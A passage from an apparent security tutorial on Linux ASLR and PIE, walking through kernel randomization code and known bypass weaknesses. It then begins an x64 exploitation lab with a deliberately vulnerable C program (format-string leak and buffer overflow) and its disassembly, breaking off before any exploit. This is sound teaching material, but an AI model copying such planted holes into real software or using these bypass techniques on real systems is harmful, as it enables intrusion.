<p>The last two times we talked about <a href="https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/">Data Execution Prevention</a> and <a href="https://0x00sec.org/t/exploit-mitigation-techniques-stack-canaries/">Stack Canaries</a><br>
Today I want to talk about Address Space Layout Randomization or ASLR in short.</p>
<p>Format wise the article will be structured the following way:</p>
<ol>
<li>Introduction to the technique</li>
<li>Current implementation details</li>
<li>Weaknesses</li>
<li>PoC on how to bypass ASLR</li>
<li>Conclusion</li>
</ol>
<blockquote>
<p>Disclaimer: The following is the result of a self study and might contain faulty information. If you find any let me know. Thanks!</p>
</blockquote>
<hr>
<h2><a name="p-21375-requirements-2" class="anchor" href="https://d.clarkee.co.uk#p-21375-requirements-2"></a>Requirements</h2>
<ul>
<li>A bunch of spare minutes</li>
<li>A basic understanding of what causes memory corruptions/information leaks</li>
<li>The will to ask or look up unknown terms yourself</li>
<li>ASM/C knowledge</li>
<li>x64 exploitation basics</li>
<li>return oriented programming basics</li>
<li>knowledge from my previous 2 installments</li>
</ul>
<hr>
<h2><a name="p-21375-address-space-layout-randomization-3" class="anchor" href="https://d.clarkee.co.uk#p-21375-address-space-layout-randomization-3"></a>Address Space Layout Randomization</h2>
<h3><a name="p-21375-basic-design-4" class="anchor" href="https://d.clarkee.co.uk#p-21375-basic-design-4"></a>Basic Design</h3>
<p>With DEP and canaries in place adversaries could not easily execute arbitrary inserted code in memory anymore.<br>
Memory pages, where buffer contents reside are marked non executable and the canary value prevents a simple overwrite of any return statement within a function.<br>
A problem that was still present and exploited was that executed processes had a static address mapping.<br>
That made it easy to find addresses of library functions or the run binary itself in memory.<br>
Ultimately leading to a successful arc injection attack without much effort.</p>
<p>As a result address space layout randomization (ASLR) emerged to bring another security parameter to the table to deny adversaries easily guessable memory locations.<br>
The idea is to place objects randomly in the virtual address space causing a non trivial problem to solve for an attacker, which is the ability to execute placed malicious code at will.<br>
A very tl;dr version of ASLR would be that a random offset value is added to the base address during process creation to independently change all three areas of a process’s address space, consisting of an executable, mapped and stacked area.<br>
In short the most exploited areas: the stack, the heap and the libraries are mapped randomly in memory to prevent abuse.</p>
<p>Linux offers three different ASLR modes which are displayed below:</p>
<pre><code class="lang-auto">Linux ASLR can be configured through setting a value in /proc/sys/kernel/randomize_va_space.
Three types of flags are available

0 – No randomization. Everything is static.
1 – Conservative randomization. Shared libraries, stack, mmap(), VDSO and heap are randomized.
2 – Full randomization. In addition to elements listed in the previous point, memory managed through brk() is also randomized.
</code></pre>
<blockquote>
<p>Note:  “VDSO” (virtual dynamic shared object) is a small shared library that the kernel automatically maps into the address space of all user-space applications.</p>
</blockquote>
<blockquote>
<p>Note 2: mmap() creates a new mapping in the virtual address space of the calling process.</p>
</blockquote>
<blockquote>
<p>Note 3: brk() and sbrk() change the location of the program break, which defines the end of the process’s data segment.</p>
</blockquote>
<p>Beyond that Linux systems offer <strong>position independent executable (PIE)</strong> binaries, which hardens ASLR even more.<br>
PIE is an additional address space randomization technique that compiles and links executables to be fully position independent.<br>
The result is that binaries compiled that way have their <em>code segment</em>, their <em>global offset table (GOT)</em> and their <em>procedure linkage table (PLT)</em> placed at random locations within virtual memory each time the application is executed as well, leaving no more static locations.</p>
<pre><code>                                                Process Virtual Memory Mapping


                            First execution            Second Execution           Third Execution

                      +   +------------------+       +------------------+       +------------------+
                      |   |                  |       |                  |       |                  |
                      |   |                  |       +------------------+       |                  |
                      |   +------------------+       |   executable     |       |                  |
                      |   |   executable     |       |                  |       +------------------+
                      |   |                  |       +------------------+       |   executable     |
                      |   +------------------+       |                  |       |                  |
                      |   |                  |       |                  |       +------------------+
                      |   |                  |       +------------------+       |                  |
                      |   |                  |       |                  |       +------------------+
                      |   |                  |       |      heap        |       |                  |
                      |   +------------------+       |                  |       |      heap        |
                      |   |                  |       +------------------+       |                  |
                      |   |      heap        |       |                  |       +------------------+
                      |   |                  |       |                  |       |                  |
                      |   +------------------+       |                  |       |                  |
    Memory address    |   |   libraries      |       |                  |       +------------------+
    growth direction  |   |                  |       |                  |       |   libraries      |
                      |   +------------------+       |                  |       |                  |
                      |   |                  |       +------------------+       +------------------+
                      |   |                  |       |   libraries      |       |                  |
                      |   |                  |       |                  |       |                  |
                      |   |                  |       +------------------+       |                  |
                      |   |                  |       |                  |       +------------------+
                      |   |                  |       +------------------+       |                  |
                      |   |                  |       |                  |       |      Stack       |
                      |   +------------------+       |      Stack       |       |                  |
                      |   |                  |       |                  |       |                  |
                      |   |      Stack       |       |                  |       +------------------+
                      |   |                  |       +------------------+       |                  |
                      |   |                  |       |                  |       |                  |
                      |   +------------------+       |                  |       |                  |
                      |   |                  |       |                  |       |                  |
                      v   +------------------+       +------------------+       +------------------+
</code></pre>
<blockquote>
<p>Here you can see a <em>simple</em> overview on how a process can behave in memory after three successive executions</p>
</blockquote>
<hr>
<h4><a name="p-21375-pie-detour-5" class="anchor" href="https://d.clarkee.co.uk#p-21375-pie-detour-5"></a>PIE detour</h4>
<p>Let’s talk about total position independency for a moment!<br>
To make a PIE binary work correctly we have to consider  that there needs to be a way for the loader  to resolve symbols at runtime.<br>
As the address of the symbol in memory is not a part of the main binary anymore the loader adds a level of indirection in the procedure linkage table (PLT).<br>
Instead of calling, lets say <code>puts()</code> directly, the .plt section of the binary contains a special entry that points to the loader.<br>
The loader then has to resolve the actual address of the function.<br>
Once it has done that it updates an entry in the Global Offset Table (GOT).<br>
Subsequent calls to the same routine are made by jumps from the GOT entry.</p>
<blockquote>
<p>Trivia: The Linux command line program <strong>file</strong> detects PIE files as <em>dynamic shared objects (DSO)</em> instead of the usual <em>ELF file</em>.</p>
</blockquote>
<p>PIE must be viewed as an addition to ASLR, since it would not do any good if there was no ASLR in the first place.<br>
That said since a PIE binary and all of its dependencies are loaded into random locations within virtual memory each time the application is executed return oriented programming (ROP) attacks are much more difficult to execute reliably.<br>
__</p>
<p>Okay back to the main topic about ASLR!<br>
Linux based operating systems got a default ASLR implementation since kernel version 2.6.12, which was released in 2005, but got a set of patches to increase security by the PaX project later on.<br>
But already in 2001 PaX published the first design and implementation of ASLR.<br>
Only years later in 2014 with the release of kernel version 3.14 the possibility to enable kernel address space layout randomization (kASLR) was given, which has the same goal as ASLR, only with the idea in mind to randomize the kernel code location in memory when the system boots.<br>
Since kernel version 4.12 kASLR is enabled by default.<br>
The effectiveness of kASLR has been questioned quite a few times already and a variety of drawbacks are publicly known as of today.<br>
Non the less it adds a further hardening to the system and should not be dismissed that easily.<br>
I have added some references at the end for anyone interested in kASLR exploitation <img src="https://d.clarkee.co.uk/images/emoji/twitter/slight_smile.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"> .</p>
<blockquote>
<p>Side note: Windows machines on the other hand have ASLR and kASLR enabled by default since the launch of Windows Vista in 2006 and work similar, but due to the differences in system design nuances of differences exist and cannot be covered in this paper but looked up in a <a href="https://insights.sei.cmu.edu/cert/2014/02/differences-between-aslr-on-windows-and-linux.html">detailed analysis</a> issued by the CERT Institute.</p>
</blockquote>
<p>This makes clear that (k)ASLR and PIE solely rely on keeping the altered memory space secret to be effective.</p>
<hr>
<h3><a name="p-21375-aslr-implementation-diving-into-the-linux-kernel-6" class="anchor" href="https://d.clarkee.co.uk#p-21375-aslr-implementation-diving-into-the-linux-kernel-6"></a>ASLR implementation - Diving into the Linux kernel</h3>
<p>What would a research article look like if we didn’t dig into the implementations <img src="https://d.clarkee.co.uk/images/emoji/twitter/wink.png?v=15" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"> .<br>
The kernel is huge and truely a work of geniuses, as a result I will and can just scratch on the surface of the implementations for this article.<br>
This enables us to focus on the relevant parts and keep the article a reasonable length.<br>
Again remember, this will be all Linux specific, so please keep that in mind <img src="https://d.clarkee.co.uk/images/emoji/twitter/slight_smile.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"> .</p>
<blockquote>
<p>Note: We will mostly take a look at the current x86 implementation. Comparing the following to the other implementations is another topic!</p>
</blockquote>
<hr>
<h4><a name="p-21375-randomizing-a-memory-address-7" class="anchor" href="https://d.clarkee.co.uk#p-21375-randomizing-a-memory-address-7"></a>Randomizing a memory address</h4>
<p>So first of all how does the system get a randomized memory address in the available/valid address range?<br>
Luckily the kernel code is open source and (mostly <img src="https://d.clarkee.co.uk/images/emoji/twitter/smiley.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"> ) documented!<br>
Let’s take a look at the <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/drivers/char/random.c#l1342">/drivers/char/random.c</a> kernel file that exactly handles our needs:</p>
<pre data-code-wrap="c"><code class="lang-c">/**
 * randomize_page - Generate a random, page aligned address
 * @start:	The smallest acceptable address the caller will take.
 * @range:	The size of the area, starting at @start, within which the
 *		random address must fall.
 *
 * If @start + @range would overflow, @range is capped.
 *
 * NOTE: Historical use of randomize_range, which this replaces, presumed that
 * @start was already page aligned.  We now align it regardless.
 *
 * Return: A page aligned address within [start, start + range).  On error,
 * @start is returned.
 */
unsigned long
randomize_page(unsigned long start, unsigned long range)
{
	if (!PAGE_ALIGNED(start)) {
		range -= PAGE_ALIGN(start) - start;
		start = PAGE_ALIGN(start);
	}

	if (start &gt; ULONG_MAX - range)
		range = ULONG_MAX - start;

	range &gt;&gt;= PAGE_SHIFT;

	if (range == 0)
		return start;

	return start + (get_random_long() % range &lt;&lt; PAGE_SHIFT);
}

</code></pre>
<p>Essentially what happens here is that in order to generate a random address <code>randomize_page()</code> takes two arguments: a start address and a range argument.<br>
After some initital page alignment magic what it ultimately comes down to is that it uses the <code>get_random_long()</code> function and applies a modulo to get a number between the suppiled ‘start’ address within the offered ‘range’ value.</p>
<hr>
<h4><a name="p-21375-elf-binary-loading-8" class="anchor" href="https://d.clarkee.co.uk#p-21375-elf-binary-loading-8"></a>ELF binary loading</h4>
<p>If the kernel is instructed to load an ELF binary a routine called <code>load_elf_binary()</code> is invoked.<br>
This one is located in <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs/binfmt_elf.c">/fs/binfmt_elf.c</a>.<br>
Here a multitude of things happen.<br>
Lets take a quick look at these parts, which are responsible for the initialization of pointers memory, like the code, data and stack section.</p>
<pre data-code-wrap="c"><code class="lang-c">static int load_elf_binary(struct linux_binprm *bprm)
{
[...]
if (!(current-&gt;personality &amp; ADDR_NO_RANDOMIZE) &amp;&amp; randomize_va_space)
        current-&gt;flags |= PF_RANDOMIZE;
[...]
	/* Do this so that we can load the interpreter, if need be.  We will
	   change some of these later */
	retval = setup_arg_pages(bprm, randomize_stack_top(STACK_TOP),
				 executable_stack);
[...]
	/* N.B. passed_fileno might not be initialized? */
	current-&gt;mm-&gt;end_code = end_code;
	current-&gt;mm-&gt;start_code = start_code;
	current-&gt;mm-&gt;start_data = start_data;
	current-&gt;mm-&gt;end_data = end_data;
	current-&gt;mm-&gt;start_stack = bprm-&gt;p;

	if ((current-&gt;flags &amp; PF_RANDOMIZE) &amp;&amp; (randomize_va_space &gt; 1)) {
		current-&gt;mm-&gt;brk = current-&gt;mm-&gt;start_brk =
			arch_randomize_brk(current-&gt;mm);
#ifdef compat_brk_randomized
		current-&gt;brk_randomized = 1;
</code></pre>
<p>We can see that if the <code>randomize_va_space</code> variable is higher than 1, and the <code>PF_RANDOMIZE</code> flag is set, the base address of <code>brk()</code> is randomized with the <code>arch_randomize_brk()</code> function.<br>
Furthermore the top of the stack gets some randomization treatment as well!</p>
<hr>
<h4><a name="p-21375-brk-randomization-9" class="anchor" href="https://d.clarkee.co.uk#p-21375-brk-randomization-9"></a>brk() randomization</h4>
<blockquote>
<p>Recall: brk() changes the  location of the program break, which defines the end of the process’s data segment (i.e., the program break<br>
is the first location after the end of the uninitialized data segment). Increasing the program break has the effect of allocating memory to<br>
the process; decreasing the break deallocates memory.</p>
</blockquote>
<p>The x86 implementation of the <code>randomize_brk()</code> function is located in <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/x86/kernel/process.c">/arch/x86/kernel/process.c</a>:</p>
<pre data-code-wrap="c"><code class="lang-c">unsigned long arch_randomize_brk(struct mm_struct *mm)
{
	return randomize_page(mm-&gt;brk, 0x02000000);
}
</code></pre>
<p>It randomizes the given address space by providing the current address with an additional range argument of <code>0x02000000</code> using the former <code>randomize_page()</code> routine!</p>
<hr>
<h4><a name="p-21375-stack-randomization-10" class="anchor" href="https://d.clarkee.co.uk#p-21375-stack-randomization-10"></a>Stack randomization</h4>
<p>The stack randomization is started in the  <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs/binfmt_elf.c">/fs/binfmt_elf.c</a> as well.<br>
In particular in the <code>load_elf_binary()</code> we talked above already!</p>
<pre data-code-wrap="c"><code class="lang-c">static int load_elf_binary(struct linux_binprm *bprm)
{
[...]
	/* Do this so that we can load the interpreter, if need be.  We will
	   change some of these later */
	retval = setup_arg_pages(bprm, randomize_stack_top(STACK_TOP),
				 executable_stack);
[...]
</code></pre>
<p>In the end we have 2 components we have to take a look at here. First the <code>setup_arg_pages()</code> and then <code>randomize_stack_top()</code>.<br>
Let’s start with the latter, since it’s needed as a function argument for <code>setup_arg_pages()</code>:</p>
<pre data-code-wrap="c"><code class="lang-c">[...]
#ifndef STACK_RND_MASK
#define STACK_RND_MASK (0x7ff &gt;&gt; (PAGE_SHIFT - 12))	/* 8MB of VA */
#endif

static unsigned long randomize_stack_top(unsigned long stack_top)
{
	unsigned long random_variable = 0;

	if (current-&gt;flags &amp; PF_RANDOMIZE) {
		random_variable = get_random_long();
		random_variable &amp;= STACK_RND_MASK;
		random_variable &lt;&lt;= PAGE_SHIFT;
	}
#ifdef CONFIG_STACK_GROWSUP
	return PAGE_ALIGN(stack_top) + random_variable;
#else
	return PAGE_ALIGN(stack_top) - random_variable;
#endif
[...]
}
</code></pre>
<p>It takes the top of the stack as an address and returns a page aligned version of that address +/- some random variable.<br>
This random variable is obtained by calling <code>get_random_long()</code> and doing once again some further randomization by doing a bitwise AND (&amp;=) assignment with a defined <code>STACK_RND_MASK</code> and an additional left shift AND (&lt;&lt;=) assignment with a variable <code>PAGE_SHIFT</code>.</p>
<p>Okay that was not all for the stack as we outlined just earlier..<br>
The actual stack randomization will take place in <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs/exec.c">/fs/exec.c</a> and more specifically in the <code>setup_arg_pages()</code> routine:</p>
<pre data-code-wrap="c"><code class="lang-c">[...]
/*
 * Finalizes the stack vm_area_struct. The flags and permissions are updated,
 * the stack is optionally relocated, and some extra space is added.
 */
int setup_arg_pages(struct linux_binprm *bprm,
		    unsigned long stack_top,
		    int executable_stack)
[...]
#ifdef CONFIG_STACK_GROWSUP
	/* Limit stack size */
	stack_base = rlimit_max(RLIMIT_STACK);
	if (stack_base &gt; STACK_SIZE_MAX)
		stack_base = STACK_SIZE_MAX;

	/* Add space for stack randomization. */
	stack_base += (STACK_RND_MASK &lt;&lt; PAGE_SHIFT);

	/* Make sure we didn't let the argument array grow too large. */
	if (vma-&gt;vm_end - vma-&gt;vm_start &gt; stack_base)
		return -ENOMEM;

	stack_base = PAGE_ALIGN(stack_top - stack_base);

	stack_shift = vma-&gt;vm_start - stack_base;
	mm-&gt;arg_start = bprm-&gt;p - stack_shift;
	bprm-&gt;p = vma-&gt;vm_end - stack_shift;
#else
	stack_top = arch_align_stack(stack_top);
	stack_top = PAGE_ALIGN(stack_top);

	if (unlikely(stack_top &lt; mmap_min_addr) ||
	    unlikely(vma-&gt;vm_end - vma-&gt;vm_start &gt;= stack_top - mmap_min_addr))
		return -ENOMEM;

	stack_shift = vma-&gt;vm_end - stack_top;

	bprm-&gt;p -= stack_shift;
	mm-&gt;arg_start = bprm-&gt;p;
#endif
[...]
</code></pre>
<p>If the stack segment does not grow upwards, the kernel will use <code>arch_align_stack()</code> to pass the stack top address, which was an argument of the current function we are looking at.<br>
Then it will align the returned value and continue further stack setup.<br>
The alignment procedure again can be found back in <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/x86/kernel/process.c">/arch/x86/kernel/process.c</a></p>
<pre data-code-wrap="c"><code class="lang-c">unsigned long arch_align_stack(unsigned long sp)
{
	if (!(current-&gt;personality &amp; ADDR_NO_RANDOMIZE) &amp;&amp; randomize_va_space)
		sp -= get_random_int() % 8192;
	return sp &amp; ~0xf;
}
</code></pre>
<p>If the currently executed task has no <code>ADDR_NO_RANDOMIZE</code> flag set and furthermore the <code>randomize_va_space</code> has a value besides 0 the <code>get_random_int()</code> function is invoked to perform the stack randomization.<br>
This happens in form of retrieving a random <code>int()</code> value and following up by a modulo (%) operation with 8192.<br>
After decrementing the stack pointer (sp) with the random number in case of an ASLR supported task, the talked about alignment takes place.<br>
On the x86 architecture it will align it by masking it with 0xfffffff0.</p>
<hr>
<h4><a name="p-21375-mmap-randomization-11" class="anchor" href="https://d.clarkee.co.uk#p-21375-mmap-randomization-11"></a>mmap() randomization</h4>
<blockquote>
<p>Recall:  mmap()  creates a new mapping in the virtual address space of the calling process. It takes two arguments: a start address for the new mapping and the length of the mapping.</p>
</blockquote>
<p>After performing some essential tests to avoid collisions with the randomized virtual address space of the stack the randomization routine for <code>mmap()</code> is started.<br>
We can find the essential pieces in <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/x86/mm/mmap.c">/arch/x86/mm/mmap.c</a>:</p>
<pre data-code-wrap="c"><code class="lang-c">[...]
static unsigned long mmap_base(unsigned long rnd, unsigned long task_size)
{
	unsigned long gap = rlimit(RLIMIT_STACK);
	unsigned long pad = stack_maxrandom_size(task_size) + stack_guard_gap;
	unsigned long gap_min, gap_max;

	/* Values close to RLIM_INFINITY can overflow. */
	if (gap + pad &gt; gap)
		gap += pad;

	/*
	 * Top of mmap area (just below the process stack).
	 * Leave an at least ~128 MB hole with possible stack randomization.
	 */
	gap_min = SIZE_128M;
	gap_max = (task_size / 6) * 5;

	if (gap &lt; gap_min)
		gap = gap_min;
	else if (gap &gt; gap_max)
		gap = gap_max;

	return PAGE_ALIGN(task_size - gap - rnd);
[...]
}
</code></pre>
<p>First some calculation of the maximum randomized address via <code>stack_maxrandom_size()</code> is done.<br>
We can see the routine itself already gets called with a <code>unsigned long rnd</code> parameter which is used to return a page aligned memory area, where the <code>rnd</code> is used as a factor.</p>
<p>The <code>rnd</code> variable is calculated and retrived beforehand from the <code>arch_rnd()</code> routine, which looks like:</p>
<pre data-code-wrap="c"><code class="lang-c">static unsigned long arch_rnd(unsigned int rndbits)
{
	if (!(current-&gt;flags &amp; PF_RANDOMIZE))
		return 0;
	return (get_random_long() &amp; ((1UL &lt;&lt; rndbits) - 1)) &lt;&lt; PAGE_SHIFT;
} 
</code></pre>
<p>After checking if randomization shall take places the routine consist of various metrics.<br>
The <code>rndbits</code> part depends on whether we have a 32-bit or 64-bit application.</p>
<blockquote>
<p>Note: 1UL represents am unsigned long int with a value of 1 represented at the bit level as: 00000000000000000000000000000001</p>
</blockquote>
<p>In the end we have the value 1 as an unsigned long int datatype left shifted by the by the <code>rndbits</code> value.<br>
This value is substracted by 1.<br>
Next an AND operation on the binary level with the prior result is taking place.<br>
This lastly gets left shifted by the value residing in <code>PAGE_SHIFT</code>.</p>
<p>So much for a brief overview of the linux kernel internals for now.<br>
Since the kernel is an ever evolving structure, things might be different in the near future, but the basic routines will most likely stay the same.<br>
Let’s continue since we still have a lot more to talk about!<br>
Next up will be the talk about known ASLR limitations.</p>
<hr>
<h4><a name="p-21375-flashback-data-execution-prevention-12" class="anchor" href="https://d.clarkee.co.uk#p-21375-flashback-data-execution-prevention-12"></a>Flashback: Data Execution Prevention</h4>
<blockquote>
<p>Recall: mprotect() changes protection for the calling process’s memory page(s) containing any part of the address range in the interval</p>
</blockquote>
<p>Remember my first article about data execution prevention and non executable stacks <img src="https://d.clarkee.co.uk/images/emoji/twitter/slight_smile.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"> ?</p>
<p>When skimming through the kernel code I found the code snippet responsible for making the stack (not) executable.<br>
It was right below the stack randomization part in <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs/exec.c">/fs/exec.c</a> :</p>
<pre data-code-wrap="c"><code class="lang-c">[...]
vm_flags = VM_STACK_FLAGS;

/*
 * Adjust stack execute permissions; explicitly enable for
 * EXSTACK_ENABLE_X, disable for EXSTACK_DISABLE_X and leave alone
 * (arch default) otherwise.
 */
if (unlikely(executable_stack == EXSTACK_ENABLE_X))
	vm_flags |= VM_EXEC;
else if (executable_stack == EXSTACK_DISABLE_X)
	vm_flags &amp;= ~VM_EXEC;
vm_flags |= mm-&gt;def_flags;
vm_flags |= VM_STACK_INCOMPLETE_SETUP;

ret = mprotect_fixup(vma, &amp;prev, vma-&gt;vm_start, vma-&gt;vm_end,
		vm_flags);
[...]
</code></pre>
<p>For those of you who are still interested: It uses a modified <code>mprotect()</code> routine which can be found in <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/mm/mprotect.c">/mm/mprotect.c</a>.</p>
<hr>
<h3><a name="p-21375-limitations-13" class="anchor" href="https://d.clarkee.co.uk#p-21375-limitations-13"></a>Limitations</h3>
<p>As good as ASLR sounds on paper it has multiple design flaws especially on 32 bit systems.<br>
Moreover multiple ways around ASLR have been found, which enables adversaries to still exploit applications only with a medium increase in workload in the exploit building phase.<br>
One of the most critical constraints on 32 bit systems is the fragmentation problem that limits the security design a lot.<br>
Objects are randomly mapped in memory, causing “chunks” of free memory in between mapped objects in the address space, which can also be seen in the ASLR graphics at the beginning.<br>
Eventually no big enough memory chunk to hold a new process can be found anymore.<br>
This is less of a problem of 64 bit systems due to increased size in virtual memory address space.</p>
<p>ASLR relies on randomness applied to objects mapped in memory to be effective.<br>
Nevertheless keeping a relative distance to each object in memory is maintained to give growable objects like the stack or heap more freedom, while avoiding fragmentation.<br>
This method introduces a major flaw due to too low entropy values.<br>
On average a 16 bit entropy is present on 32 bit systems, which can be brute forced within minutes at most on current systems.<br>
64 bit systems have around 40 bit available for randomization, from which only around 28 bit can be effectively used for entropy measures, making them slightly more secure.<br>
This only matters as long as one cannot guess some bits due to information leaks or similar tactics.</p>
<p>Furthermore it was observed that the random generator used by ASLR does not produce/was not producing a truly uniform mapping for all libraries on both architectures, so focusing on more likely addresses to hold mapped objects decreases the cost for a brute force attack even further.</p>
<p>Last but not least the fact that libraries are mapped next to each other in memory can be used for correlation attacks, since knowing one library address leaks the positions of all surrounding ones as well.<br>
That enabled an exploit tactic called <a href="http://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html"><em>Offset2lib</em></a>.<br>
There a buffer overflow is used to de-randomize an applications address space and fully abuse this.</p>
<p>Besides the aforementioned facts already known return to known code attacks like <strong>ret2libc</strong> or <strong>return oriented programming</strong> work as good as ever if one can find the right addresses to use.</p>
<p>Additionally for kASLR you have to note that gaining a certain pointer, which provides any kind of information about the process allocation in memory can be used to break this technique, since the kernel cannot change its distribution in memory throughout its operating time.<br>
This means that until the next system reboot a new randomization of kernel code in memory <em>will not</em> and more importantly <em>cannot</em> be performed!<br>
This fact makes kASLR weaker than its big brother ASLR, since the latter randomizes for every new spawning process.</p>
<blockquote>
<p>Note: binaries compiled without the PIE option are vulnerable even with a fully enabled ASLR present. This is the case, since an attacker could leverage the .text, .plt and .got segment within an executable. That said a valid attack type in this case is return2PLT/GOT or simply ROP!</p>
</blockquote>
<hr>
<h2><a name="p-21375-defeating-aslr-stack-canaries-and-dep-as-well-as-bypassing-full-relro-on-x64-14" class="anchor" href="https://d.clarkee.co.uk#p-21375-defeating-aslr-stack-canaries-and-dep-as-well-as-bypassing-full-relro-on-x64-14"></a>Defeating ASLR, Stack Canaries and DEP as well as bypassing FULL RELRO on x64</h2>
<p>Since ASLR does not bring anything new or fancy to the table and <em>just</em> randomizes the process address space of a given binary I thought we could just jump into x64 exploitation as well.</p>
<blockquote>
<p>Note: the last 2 articles only covered x86 binaries</p>
</blockquote>
<h3><a name="p-21375-the-vulnerable-binary-15" class="anchor" href="https://d.clarkee.co.uk#p-21375-the-vulnerable-binary-15"></a>The vulnerable binary</h3>
<p>So let’s get right into it:<br>
The vulnerable program did not change much from last time.<br>
It was already build around being exploited with ASLR in mind <img src="https://d.clarkee.co.uk/images/emoji/twitter/wink.png?v=15" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"><br>
Here is the code again:</p>
<pre data-code-wrap="c"><code class="lang-c">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

#define STDIN 0

void itIsJustASmallLeakSir() {
    char buf[512];
    scanf("%s", buf);
    printf(buf);
}

void trustMeIAmAnEngineer() {
    char buf[1024];
    read(STDIN, buf, 2048);
}

int main(int argc, char* argv[]) {
    printf("Welcome to how 2 not write Code 101");
    setbuf(stdout, NULL);
    printf("$&gt; ");
    itIsJustASmallLeakSir();
    printf("\n");
    printf("$&gt; ");
    trustMeIAmAnEngineer();

    printf("\nI reached the end!\n");

    return 0;

}
</code></pre>
<p>There are two obvious vulnerabilities at hand.<br>
One being a format string vulnerability in the <code>itIsJustASmallLeakSir()</code> function.<br>
We do have full control of the buffer contents and our given input is printed without any checks.</p>
<p>The other one being a buffer overflow possibility in the  <code>trustMeIAmAnEngineer()</code> function.<br>
Here we can read in 2048 bytes into a buffer which just can hold half of that.</p>
<p>Let’s compile it with <code>gcc -o vuln_x64 vuln.c -Wl,-z,relro,-z,now</code>.<br>
Also let’s enable full ASLR: <code>echo 2 &gt; /proc/sys/kernel/randomize_va_space</code></p>
<p>This results in a binary with the following exploit mitigations in place:</p>
<pre><code>$ checksec vuln_x64
[*] '/home/lab/Git/RE_binaries/0x00sec/ASLR/binaries/vuln_x64'
    Arch:     amd64-64-little
    RELRO:    FULL RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<p>The assembly did not change too much either obviously.<br>
For the sake of completeness let’s take a look again:</p>
<p><code>main()</code>:</p>
<pre><code class="lang-auto">gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x0000000000400813 &lt;+0&gt;:	push   rbp
   0x0000000000400814 &lt;+1&gt;:	mov    rbp,rsp
   0x0000000000400817 &lt;+4&gt;:	sub    rsp,0x10
   0x000000000040081b &lt;+8&gt;:	mov    DWORD PTR [rbp-0x4],edi
   0x000000000040081e &lt;+11&gt;:	mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000400822 &lt;+15&gt;:	mov    edi,0x400930			   ; string to be printed
   0x0000000000400827 &lt;+20&gt;:	mov    eax,0x0
   0x000000000040082c &lt;+25&gt;:	call   0x400620 &lt;printf@plt&gt;		   ; Welcome message is printed
   0x0000000000400831 &lt;+30&gt;:	mov    rax,QWORD PTR [rip+0x200830]        # 0x601068 &lt;stdout@@GLIBC_2.2.5&gt;
   0x0000000000400838 &lt;+37&gt;:	mov    esi,0x0
   0x000000000040083d &lt;+42&gt;:	mov    rdi,rax
   0x0000000000400840 &lt;+45&gt;:	call   0x400610 &lt;setbuf@plt&gt;
   0x0000000000400845 &lt;+50&gt;:	mov    edi,0x400954		           ; string to be printed
   0x000000000040084a &lt;+55&gt;:	mov    eax,0x0
   0x000000000040084f &lt;+60&gt;:	call   0x400620 &lt;printf@plt&gt;		   ; "$&gt; "
   0x0000000000400854 &lt;+65&gt;:	mov    eax,0x0
   0x0000000000400859 &lt;+70&gt;:	call   0x400766 &lt;itIsJustASmallLeakSir&gt;	   ; function call
   0x000000000040085e &lt;+75&gt;:	mov    edi,0xa				   ; string to be printed "\n"
   0x0000000000400863 &lt;+80&gt;:	call   0x4005e0 &lt;putchar@plt&gt;		   ; "\n"
   0x0000000000400868 &lt;+85&gt;:	mov    edi,0x400954		           ; string to be printed
   0x000000000040086d &lt;+90&gt;:	mov    eax,0x0
   0x0000000000400872 &lt;+95&gt;:	call   0x400620 &lt;printf@plt&gt;	           ; "$&gt; "
   0x0000000000400877 &lt;+100&gt;:	mov    eax,0x0
   0x000000000040087c &lt;+105&gt;:	call   0x4007c4 &lt;trustMeIAmAnEngineer&gt;	   ; function call
   0x0000000000400881 &lt;+110&gt;:	mov    edi,0x400958			   ; string to be printed
   0x0000000000400886 &lt;+115&gt;:	call   0x4005f0 &lt;puts@plt&gt;		   ; "\nI reached the end!\n"
   0x000000000040088b &lt;+120&gt;:	mov    eax,0x0
   0x0000000000400890 &lt;+125&gt;:	leave  
   0x0000000000400891 &lt;+126&gt;:	ret    
End of assembler dump.
</code></pre>
<p><code>itIsJustASmallLeakSir()</code>  next.</p>
<pre><code class="lang-auto">gdb-peda$ disassemble itIsJustASmallLeakSir 
Dump of assembler code for function itIsJustASmallLeakSir:
   0x0000000000400766 &lt;+0&gt;:	push   rbp
   0x0000000000400767 &lt;+1&gt;:	mov    rbp,rsp
   0x000000000040076a &lt;+4&gt;:	sub    rsp,0x210
   0x0000000000400771 &lt;+11&gt;:	mov    rax,QWORD PTR fs:0x28		; stack canary right here
   0x000000000040077a &lt;+20&gt;:	mov    QWORD PTR [rbp-0x8],rax
   0x000000000040077e &lt;+24&gt;:	xor    eax,eax
   0x0000000000400780 &lt;+26&gt;:	lea    rax,[rbp-0x210]			; stack setup
   0x0000000000400787 &lt;+33&gt;:	mov    rsi,rax
   0x000000000040078a &lt;+36&gt;:	mov    edi,0x400928
   0x000000000040078f &lt;+41&gt;:	mov    eax,0x0
   0x0000000000400794 &lt;+46&gt;:	call   0x400650 &lt;__isoc99_scanf@plt&gt;	; user input is read
